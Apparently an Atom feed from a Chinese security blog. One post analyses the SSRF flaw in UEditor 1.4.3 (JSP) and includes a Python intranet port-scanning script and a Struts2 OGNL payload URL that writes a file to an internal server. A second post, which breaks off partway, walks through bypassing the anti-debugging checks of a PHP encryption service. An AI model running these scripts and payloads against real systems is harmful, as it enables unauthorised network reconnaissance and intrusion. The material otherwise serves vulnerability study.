    <content type="html"><![CDATA[<p>前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。</p><a id="more"></a><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>查看官方的<a href="http://ueditor.baidu.com/website/changelog.html" target="_blank" rel="noopener">更新日志</a>可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。<img src="UEditor-SSRF-In-JSP%5C01.png" alt="01"></p><p>那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现<code>wooyun-2015-0133125</code>中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：<a href="https://github.com/fex-team/ueditor/" target="_blank" rel="noopener">https://github.com/fex-team/ueditor/</a> 。</p><p>查看版本1.4.3.1下的<a href="https://github.com/fex-team/ueditor/tree/v1.4.3.1/jsp" target="_blank" rel="noopener">jsp代码</a>.</p><p><img src="UEditor-SSRF-In-JSP%5C02.png" alt="02"></p><p>可以发现在该版本有一次commit，commitId 为<code>a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6</code>。根据字面意思应该是增加了修复SSRF的代码。</p><p>下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。</p><p><img src="UEditor-SSRF-In-JSP%5C03.png" alt="03"></p><p>发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的<code>validHost</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">InetAddress ip = InetAddress.getByName(hostname);<span class="comment">//根据主机名获取ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ip.isSiteLocalAddress()) &#123;<span class="comment">//是否为地区本地地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSiteLocalAddress</code>方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。</p><blockquote><p>IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。</p></blockquote><p>搜索后发现在<code>captureRemoteData</code>中调用了<code>validHost</code>方法。</p><p> <img src="UEditor-SSRF-In-JSP%5C04.png" alt="05"></p><p>根据代码可以分析：首先使用<code>validHost</code>对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用<code>validContentState</code>方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。</p><p>所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。</p><p>继续查看在<code>capture</code>方法中调用了<code>captureRemoteData</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> State <span class="title">capture</span> <span class="params">( String[] list )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">MultiState state = <span class="keyword">new</span> MultiState( <span class="keyword">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( String source : list ) &#123;</span><br><span class="line">state.addState( captureRemoteData( source ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>invoke</code>中调用了<code>capture</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> ( actionType == <span class="keyword">null</span> || !ActionMap.mapping.containsKey( actionType ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> BaseState( <span class="keyword">false</span>, AppInfo.INVALID_ACTION ).toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">State state = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> actionCode = ActionMap.getType( <span class="keyword">this</span>.actionType );</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ( actionCode ) &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ActionMap.CATCH_IMAGE:</span><br><span class="line">conf = configManager.getConfig( actionCode );</span><br><span class="line">String[] list = <span class="keyword">this</span>.request.getParameterValues( (String)conf.get( <span class="string">"fieldName"</span> ) );</span><br><span class="line">state = <span class="keyword">new</span> ImageHunter( conf ).capture( list );</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state.toJSONString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用<code>capture</code>需要满足条件为<code>actionCode</code>为<code>ActionMap.CATCH_IMAGE</code>，在<code>ActionMap</code>中value为<code>ActionMap.CATCH_IMAGE对应的</code>key为<code>catchimage。所以</code>当<code>actionType</code>值为<code>catchimage</code>，即<code>action</code>参数对应为<code>catchimage</code>时，才可能触发SSRF漏洞。下面对漏洞进行验证。</p><h2 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h2><p>这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考<a href="http://fex.baidu.com/ueditor/#server-jsp）。" target="_blank" rel="noopener">http://fex.baidu.com/ueditor/#server-jsp）。</a></p><p><img src="UEditor-SSRF-In-JSP%5C05.png" alt="04"></p><p>功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足<code>action</code>参数为<code>catchimage</code>。</p><p>在<code>case ActionMap.CATCH_IMAGE</code>中下断点，然后进行调试。</p><p>访问链接<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage</a></p><p><img src="UEditor-SSRF-In-JSP%5C06.png" alt="1527146004264"></p><p>继续运行发现list为空，然后就抛出了异常。</p><p>再次运行，查看list数据从何而来。</p><p><img src="UEditor-SSRF-In-JSP%5C07.png" alt="1527146184688"></p><p>可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的<code>catcherAllowFiles</code>。</p><p>已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。</p><p>构造请求链接：<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png</a></p><p><img src="UEditor-SSRF-In-JSP%5C08.png" alt="1527151024365"></p><p>当进入<code>validHost</code>方法时，由于被访问的主机地址不在过滤的范围，所以返回true。</p><blockquote><p>这里可以发现，仅仅对<code>127.0.0.1</code>、<code>localhost</code>和<code>img.baidu.com</code>进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。</p></blockquote><p><img src="UEditor-SSRF-In-JSP%5C09.png" alt="1527151160299"></p><p>而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。</p><p>这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：</p><ol><li>如果抓取不存在的图片地址时，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&quot;} ]}</code>，即state为“远程连接出错”。</li><li>如果成功抓取到图片，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}</code>，即state为“SUCCESS”。</li><li>如果主机无法访问，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25&quot;} ]}</code>，即state为“抓取远程图片失败”。</li></ol><blockquote><p>由于除了在config.js中的<code>catcherLocalDomain</code>配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。</p></blockquote><h2 id="0x04-代码实现"><a href="#0x04-代码实现" class="headerlink" title="0x04 代码实现"></a>0x04 代码实现</h2><p>由上述分析，根据返回包中的state进行判断，当state为<code>&quot;远程连接出错&quot;</code>或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__Date__=<span class="string">"20180524"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133</span></span><br><span class="line"><span class="string">python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Python version: 3.6.2</span></span><br><span class="line"><span class="string">requirements:IPy==0.83</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> IPy <span class="keyword">import</span> IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url,ip,port)</span>:</span></span><br><span class="line">url = <span class="string">'%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png'</span> % (url,ip,port)</span><br><span class="line">res = requests.get(url)</span><br><span class="line">result = res.text</span><br><span class="line">result = result.replace(<span class="string">"list"</span>,<span class="string">"\"list\""</span>)</span><br><span class="line">res_json = json.loads(result)</span><br><span class="line">state = res_json[<span class="string">'list'</span>][<span class="number">0</span>][<span class="string">'state'</span>]</span><br><span class="line"><span class="keyword">if</span> state == <span class="string">'远程连接出错'</span> <span class="keyword">or</span> state == <span class="string">'SUCCESS'</span>:</span><br><span class="line">print(ip,port,<span class="string">'is Open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url,ip)</span>:</span></span><br><span class="line"></span><br><span class="line">ips = IP(ip)</span><br><span class="line">ports = [<span class="number">80</span>,<span class="number">8080</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">check(url,i,port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">main(url,ip)</span><br></pre></td></tr></table></figure><blockquote><p>由于返回的结果为<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}</code>并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。</p></blockquote><p>在实际测试中的测试结果如下：</p><p><img src="UEditor-SSRF-In-JSP%5C10.png" alt="1527148655823"></p><h2 id="0x05-综合利用"><a href="#0x05-综合利用" class="headerlink" title="0x05 综合利用"></a>0x05 综合利用</h2><p>对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路：</p><p><code>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</code></p><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。</p><p>执行命令：</p><p><code>python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.135.155 80 is Open</span><br><span class="line"></span><br><span class="line">192.168.135.155 8080 is Open</span><br></pre></td></tr></table></figure><p>发现端口80 和 8080 开放，然后进行应用的识别。</p><h3 id="应用识别"><a href="#应用识别" class="headerlink" title="应用识别"></a>应用识别</h3><p>80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。</p><p><img src="UEditor-SSRF-In-JSP%5C11.png" alt="1527175485827"></p><p>然后尝试查看是否存在Struts2漏洞。</p><h3 id="攻击Payload"><a href="#攻击Payload" class="headerlink" title="攻击Payload"></a>攻击Payload</h3><p>由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。</p><p>首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为<code>Struts2_Test.png</code>。</p><p><img src="UEditor-SSRF-In-JSP%5C12.png" alt="1527181406261"></p><blockquote><p>这里之所以写入内容为<code>Struts2_Test.png</code>，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如</p><p><a href="http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。" target="_blank" rel="noopener">http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。</a></p></blockquote><p>然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。</p><p>这里需要抓取的图片地址为：<a href="http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png" target="_blank" rel="noopener">http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png</a></p><p><img src="UEditor-SSRF-In-JSP%5C13.png" alt="1527181487872"></p><p>由上图可以看出，最后抓取的文件保存地址为：<code>/ueditor/jsp/upload/image/20180525/1527181480175039672.png</code></p><h3 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h3><p>然后访问<a href="http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png" target="_blank" rel="noopener">http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png</a></p><p>查看是否攻击成功。</p><p><img src="UEditor-SSRF-In-JSP%5C14.png" alt="1527181545625"></p><p>表明攻击成功。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如<code>/jmx-console/images/logo.gif</code>, <code>/tomcat.png）</code>，判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="Ueditor" scheme="https://fuping.site/tags/Ueditor/"/>
    
      <category term="SSRF" scheme="https://fuping.site/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>某PHP加密文件解密过程初探</title>
    <link href="https://fuping.site/2018/02/08/Free-PhpJiaMi-Decrypt/"/>
    <id>https://fuping.site/2018/02/08/Free-PhpJiaMi-Decrypt/</id>
    <published>2018-02-08T10:08:24.000Z</published>
    <updated>2018-02-09T03:08:36.771Z</updated>
    
    <content type="html"><![CDATA[<p>最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。<br>安装php debug插件比较简单，直接快捷键ctrl + shift + x  或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。<br><img src="01.jpg" alt="01"><br>然后安装即可。<br>其次是安装XDebug。安装可以参考:<a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">https://xdebug.org/docs/install</a> 。首先查看一下PHP版本。我这里用的是5.5.30。<br><img src="02.jpg" alt="02"><br>打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。<br><img src="03.jpg" alt="03"><br>打开扩展。<br><img src="04.png" alt="04"><br>注意设置<code>xdebug.remote_autostart = 1</code>。这样设置好debug和断点后，浏览器运行即可自动命中断点。<br>打开VSCode，设置编辑php的可执行文件路径。<br><img src="05.jpg" alt="05"><br>这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。<br><img src="06.jpg" alt="06"><br>给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。<br><img src="07.jpg" alt="07"><br>乱码的话可以通过更改文件编码来设置。快捷键<code>Ctrl + Shift + P</code>，选择更改文件编码，找到合适的编码。<br><img src="08.jpg" alt="08"><br>php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_execution_time = <span class="number">300</span></span><br></pre></td></tr></table></figure><h1 id="0x02-解密"><a href="#0x02-解密" class="headerlink" title="0x02 解密"></a>0x02 解密</h1><h4 id="1-独立加密"><a href="#1-独立加密" class="headerlink" title="1.独立加密"></a>1.独立加密</h4><p>上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。<br><img src="09.jpg" alt="09"><br>加密后大概是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span>error_reporting(<span class="number">0</span>);ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);<span class="keyword">if</span>(!defined(<span class="string">'kcapwkef'</span>))&#123;define(<span class="string">'kcapwkef'</span>,<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(!function_exists(<span class="string">"�㒁�؁��"</span>))&#123;<span class="function"><span class="keyword">function</span> �����ٹ�<span class="params">($������)</span></span>&#123;<span class="keyword">global</span>$Đ���Л�,$�……</span><br></pre></td></tr></table></figure><p>使用PHP-Parser对代码进行格式化，便于调试。<br>执行命令<code>composer require nikic/php-parser</code><br><img src="10.jpg" alt="10"><br>利用作者的format.php将代码格式化。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'9014/t.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'9014/t2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure><p>然后执行命令<code>php format.php</code>，会生成格式化的t2.php。<br><img src="11.jpg" alt="11"><br>选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是<code>Western (ISO 8859-1)</code>。<br>我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。<br>F10运行时发现在102行退出了程序。<br><img src="12.jpg" alt="12"><br>然后在第102行下断点，F11单步运行。进入后继续F10运行。<br><img src="13.jpg" alt="13"><br>当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字<code>decode_func</code>）。<br><img src="14.jpg" alt="14"><br>直接在73行返回值处下断点，然后F5运行，看返回的结果。<br><img src="15.jpg" alt="15"><br>同理，查看第15行返回的结果。<br><img src="16.jpg" alt="16"><br>那么第23行处的代码为：<br><code>php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;</code><br><img src="17.jpg" alt="17"><br>由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。<br><img src="18.jpg" alt="18"><br>此处代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由控制台发现<br><code>!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])</code><br>执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。<br><img src="19.jpg" alt="19"><br>第28-32行对应代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$t = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $t &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处判断执行时间大于100毫秒就退出，当然还是注释即可。<br>运行至第34行，程序退出。F11进入。调用了第52行的<code>decode_func</code>函数。<br><img src="20.jpg" 